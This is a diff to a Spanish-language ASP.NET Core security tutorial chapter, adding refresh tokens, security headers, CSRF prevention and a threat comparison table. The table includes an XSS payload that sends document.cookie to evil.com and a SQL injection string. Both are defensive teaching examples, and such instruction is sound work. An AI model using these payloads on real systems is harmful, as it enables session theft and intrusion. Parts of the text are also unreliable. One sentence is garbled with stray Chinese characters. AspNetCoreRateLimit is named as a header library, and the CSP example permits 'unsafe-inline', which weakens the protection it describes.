@@ -2,10 +2,13 @@
   - [24.1. Autenticación: ¿Quién Eres?](#241-autenticación-quién-eres)
   - [24.2. Autorización: ¿Qué Puedes Hacer?](#242-autorización-qué-puedes-hacer)
   - [24.3. JWT: Estructura y Flujo](#243-jwt-estructura-y-flujo)
-  - [24.4. Hashing de Contraseñas: BCrypt](#244-hashing-de-contraseñas-bcrypt)
-  - [24.5. CORS: Orígenes Permitidos](#245-cors-orígenes-permitidos)
-  - [24.6. HTTPS: Comunicación Segura](#246-https-comunicación-segura)
-  - [24.7. OWASP Top 10](#247-owasp-top-10)
+  - [24.4. Refresh Token: Renovar JWT](#244-refresh-token-renovar-jwt)
+  - [24.5. Hashing de Contraseñas: BCrypt](#245-hashing-de-contraseñas-bcrypt)
+  - [24.6. CORS: Orígenes Permitidos](#246-cors-orígenes-permitidos)
+  - [24.7. HTTPS: Comunicación Segura](#247-https-comunicación-segura)
+  - [24.8. Security Headers](#248-security-headers)
+  - [24.9. CSRF: Cross-Site Request Forgery](#249-csrf-cross-site-request-forgery)
+  - [24.10. OWASP Top 10](#2410-owasp-top-10)
 
 
 # 24. Seguridad en Aplicaciones Web
@@ -235,7 +238,80 @@ public string GenerarToken(int userId, string email, string role)
 
 📌 **Ejemplo real:** Cuando haces login en Spotify, el servidor genera un JWT con tu ID y tipo de cuenta (free/premium). Cada vez que Spotify reproduce una canción, envía ese JWT para verificar que tienes derecho a escucharla.
 
-## 24.4. Hashing de Contraseñas: BCrypt
+## 24.4. Refresh Token: Renovar JWT
+
+Un **Access Token** dura poco (15-30 minutos). Un **Refresh Token** dura días o semanas y permite obtener un nuevo Access Token sin pedir login de nuevo.
+
+```mermaid
+sequenceDiagram
+    participant U as 👤 Usuario
+    participant S as ⚙️ Servidor
+
+    U->>S: POST /login (usuario + contraseña)
+    S-->>U: Access Token (15min) + Refresh Token (7 días)
+
+    U->>S: GET /api/datos (Authorization: Bearer access_token)
+    S-->>U: 200 OK + Datos
+
+    Note over U: ...15 minutos después...
+
+    U->>S: GET /api/datos (Access Token EXPIRADO)
+    S-->>U: 401 Unauthorized
+
+    U->>S: POST /refresh (Refresh Token)
+    S->>S: Verifica Refresh Token en BD
+    S-->>U: Nuevo Access Token (15min)
+
+    U->>S: GET /api/datos (nuevo Access Token)
+    S-->>U: 200 OK + Datos
+
+    style U fill:#2196F3,color:#fff
+    style S fill:#4CAF50,color:#fff
+```
+
+> 💡 **Analogía — El Billete y el Carnet:**
+> El **Access Token** es como un billete de una sesión de cine: dura poco (2 horas) y si se te acaba, no puedes entrar. El **Refresh Token** es como el carnet de socio del cine: cuando se te acaba la sesión, vas a taquilla, muestras el carnet y te dan una nueva entrada sin tener que hacer todo el proceso de compra de nuevo.
+
+```csharp
+// Refresh Token: renovar Access Token
+[HttpPost("refresh")]
+public async Task<IActionResult> Refresh([FromBody] RefreshRequest request)
+{
+    // 1. Verificar que el Refresh Token existe y no ha expirado
+    var refreshToken = await _context.RefreshTokens
+        .FirstOrDefaultAsync(t => t.Token == request.Token && !t.IsRevoked);
+
+    if (refreshToken is null || refreshToken.ExpiresAt < DateTime.UtcNow)
+        return Unauthorized("Refresh Token inválido o expirado");
+
+    // 2. Generar nuevo Access Token
+    var usuario = await _userManager.FindByIdAsync(refreshToken.UserId);
+    var newAccessToken = GenerateJwtToken(usuario);
+
+    // 3. Generar nuevo Refresh Token (rotación)
+    var newRefreshToken = CreateRefreshToken(usuario.Id);
+    refreshToken.IsRevoked = true; // Revocar el antiguo
+    await _context.SaveChangesAsync();
+
+    return Ok(new { AccessToken = newAccessToken, RefreshToken = newRefreshToken.Token });
+}
+```
+
+> ⚠️ **Advertencia:** Usa **rotación de Refresh Tokens** — cada vez que se usa, se revoca el antiguo y se genera uno nuevo. Así, si alguien roba un Refresh Token y lo usa, el usuario legítimo se dará cuenta (su token dejó de funcionar).
+
+### Tabla comparativa: JWT vs Session/Cookie
+
+| Característica | JWT | Session/Cookie |
+|----------------|-----|----------------|
+| **Dónde se guarda** | Cliente (localStorage, cookie) | Servidor (memoria, BD) |
+| **Escalabilidad** | ✅ Sin estado (stateless) | ❌ Requiere sesión en servidor |
+| **Revocación** | ❌ Difícil (hasta que expire) | ✅ Fácil (borrar sesión) |
+| **Rendimiento** | ✅ Sin consultas a BD | ❌ Consulta a BD cada petición |
+| **Tamaño** | ⚠️ Mayor (payload completo) | ✅ Solo ID de sesión |
+| **Seguridad** | ⚠️ Robo de token = acceso completo | ✅ Cookie con HttpOnly/Secure |
+| **Uso típico** | APIs REST, SPA, móviles | Web apps tradicionales, SSR |
+
+## 24.5. Hashing de Contraseñas: BCrypt
 
 **NUNCA** almacenes contraseñas en texto plano. Usa **hashing** con un algoritmo seguro como **BCrypt**.
 
@@ -420,7 +496,114 @@ app.UseHttpsRedirection();
 
 > 💡 **Consejo:** Para desarrollo local, usa `dotnet dev-certs https` para generar un certificado autofirmado. En producción, usa Let's Encrypt (gratuito) o un certificado comercial.
 
-## 24.7. OWASP Top 10
+## 24.8. Security Headers
+
+Las **Security Headers** son cabeceras HTTP que protegen tu app de ataques comunes. Configúralas en ASP.NET Core:
+
+```mermaid
+graph TB
+    subgraph HEADERS["Security Headers — Capas de Protección"]
+        H1["X-Content-Type-Options<br/>nosniff"] --> H2["X-Frame-Options<br/>DENY"]
+        H2 --> H3["X-XSS-Protection<br/>1; mode=block"]
+        H3 --> H4["Strict-Transport-Security<br/>max-age=31536000"]
+        H4 --> H5["Content-Security-Policy<br/>default-src 'self'"]
+    end
+
+    style HEADERS fill:#4CAF50,color:#fff
+```
+
+| Cabecera | Protege contra | Valor recomendado |
+|----------|---------------|-------------------|
+| `X-Content-Type-Options` | MIME sniffing (ejecutar JS como HTML) | `nosniff` |
+| `X-Frame-Options` | Clickjacking (iframes ocultos) | `DENY` |
+| `X-XSS-Protection` | XSS en navegadores antiguos | `1; mode=block` |
+| `Strict-Transport-Security` | Fuerza HTTPS (HSTS) | `max-age=31536000; includeSubDomains` |
+| `Content-Security-Policy` | XSS, inyección de scripts | `default-src 'self'` |
+| `Referrer-Policy` | Filtración de URLs | `strict-origin-when-cross-origin` |
+| `Permissions-Policy` | Acceso a cámara, micrófono, etc. | `camera=(), microphone=()` |
+
+```csharp
+// Configurar Security Headers en ASP.NET Core
+app.Use(async (context, next) =>
+{
+    context.Response.Headers.Append("X-Content-Type-Options", "nosniff");
+    context.Response.Headers.Append("X-Frame-Options", "DENY");
+    context.Response.Headers.Append("X-XSS-Protection", "1; mode=block");
+    context.Response.Headers.Append("Strict-Transport-Security",
+        "max-age=31536000; includeSubDomains");
+    context.Response.Headers.Append("Content-Security-Policy",
+        "default-src 'self'; script-src 'self' 'unsafe-inline'");
+    context.Response.Headers.Append("Referrer-Policy", "strict-origin-when-cross-origin");
+    context.Response.Headers.Append("Permissions-Policy",
+        "camera=(), microphone=(), geolocation=()");
+    await next();
+});
+```
+
+> 💡 **Consejo:** Usa la librería `NWebsec` o `AspNetCoreRateLimit` para configurar headers de forma declarativa en vez de manual.
+
+## 24.9. CSRF: Cross-Site Request Forgery
+
+El **CSRF** es un ataque donde un sitio malicioso hace peticiones a tu app usando las credenciales del usuario (cookies) sin su consentimiento.
+
+```mermaid
+sequenceDiagram
+    participant U as 👤 Víctima (logueada en tuapp.com)
+    participant M as 🖥️ Sitio Malicioso (evil.com)
+    participant S as ⚙️ Tu Servidor (tuapp.com)
+
+    U->>M: Visita evil.com
+    Note over M: evil.com tiene un formulario oculto<br/>que hace POST a tuapp.com
+    M->>S: POST /transferir (con cookies de U)
+    Note over S: Cookies válidas → ejecuta transferencia
+    S-->>M: 200 OK
+    Note over U: 😱 Usuario no se enteró
+
+    style U fill:#2196F3,color:#fff
+    style M fill:#f44336,color:#fff
+    style S fill:#4CAF50,color:#fff
+```
+
+### Prevención con Anti-Forgery Tokens
+
+```csharp
+// Program.cs: Habilitar anti-forgery
+builder.Services.AddAntiforgery(options =>
+{
+    options.HeaderName = "X-CSRF-TOKEN";
+    options.Cookie.Name = "CSRF-TOKEN";
+    options.Cookie.HttpOnly = true;
+    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
+});
+
+// En el formulario HTML
+<form method="post">
+    @Html.AntiForgeryToken()
+    <input type="text" name="nombre" />
+    <button type="submit">Enviar</button>
+</form>
+
+// En el endpoint
+[HttpPost]
+[ValidateAntiForgeryToken] // Verifica el token
+public IActionResult Transferir([FromBody] TransferenciaRequest request)
+{
+    // Solo llega si el token es válido
+    return Ok();
+}
+```
+
+> 💡 **Consejo:** Para APIs SPA, usa tokens CSRF en cabeceras (no cookies). El于御览.ts de Angular, React o Vue envían el token en cada petición POST/PUT/DELETE.
+
+### Tabla comparativa: CSRF vs XSS vs SQL Injection
+
+| Amenaza | Qué hace | Ejemplo | Prevención |
+|---------|----------|---------|------------|
+| **CSRF** | Finge ser el usuario | Formulario oculto que transfiere dinero | Anti-Forgery Tokens |
+| **XSS** | Inyecta JavaScript | `<script>document.location='evil.com?c='+document.cookie` | Sanitización + CSP |
+| **SQL Injection** | Inyecta SQL | `' OR '1'='1` en un campo de login | Parámetros SQL |
+
+## 24.10. OWASP Top 10
 
 El **OWASP Top 10** es la lista de las 10 vulnerabilidades de seguridad más comunes en aplicaciones web.
 
@@ -478,9 +661,12 @@ builder.Services.AddRateLimiter(options =>
 | **Autenticación** | Verificar la identidad del usuario (¿quién eres?) |
 | **Autorización** | Determinar qué puede hacer (¿qué permisos tienes?) |
 | **JWT** | Token firmado con datos del usuario (Header.Payload.Signature) |
+| **Refresh Token** | Token de larga duración para renovar JWT sin login |
 | **BCrypt** | Algoritmo de hashing seguro para contraseñas |
 | **CORS** | Control de orígenes permitidos para peticiones HTTP |
 | **HTTPS** | HTTP con cifrado SSL/TLS |
+| **Security Headers** | Cabeceras que protegen de XSS, clickjacking, sniffing |
+| **CSRF** | Ataque que usa cookies del usuario sin su consentimiento |
 | **OWASP Top 10** | Las 10 vulnerabilidades web más comunes |
 | **SQL Injection** | Inyección de código SQL, se previene con parámetros |
 | **XSS** | Cross-Site Scripting, se previene sanitizando entradas |
